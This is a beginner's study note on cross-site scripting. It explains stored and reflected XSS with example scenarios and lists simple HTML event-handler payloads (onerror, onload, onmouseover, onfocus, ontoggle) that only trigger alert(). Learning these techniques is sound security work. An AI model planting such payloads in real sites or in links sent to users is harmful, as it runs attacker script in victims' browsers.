# XSS learning

todasy ive learned about some basic xss.

xss is essentially tricking the browser into runnign malicious code by making it run unwanted js

stored xss:
    the js is somehow made to be stored on the site, for example a liketree like site, and the user makes his pfp an invlid image link to cause on error and uses "onerror" to trigger js on any visitors browsers.

reflected xss:
    this is when a site takes a user input and then runs it as js in that browser session, it onyl effects that one person. so for example there is a site that sotres referal codes in their cookies, and displays it when you visit your settings. if you ivnite a user with a malicious "?ref=" in the link and that is set as their referal they will run whatever payload you set whenever they visit their settings

## onerror
```html
<img src=x onerror="alert('onerror')">
```
```html
<video src=x onerror="alert('onerror')">
```
```html
<audio src=x onerror="alert('onerror')">
```

## onload
```html
<svg onload="alert('onload')">
```
```html
<body onload="alert('onload')">
```
```html
<iframe onload="alert('onload')">
```

## interactive
```html
<div onmouseover="alert('hover')">hover me</div>
```
```html
<input onfocus="alert('focus')" autofocus>
```
```html
<details open ontoggle="alert('toggle')">
```

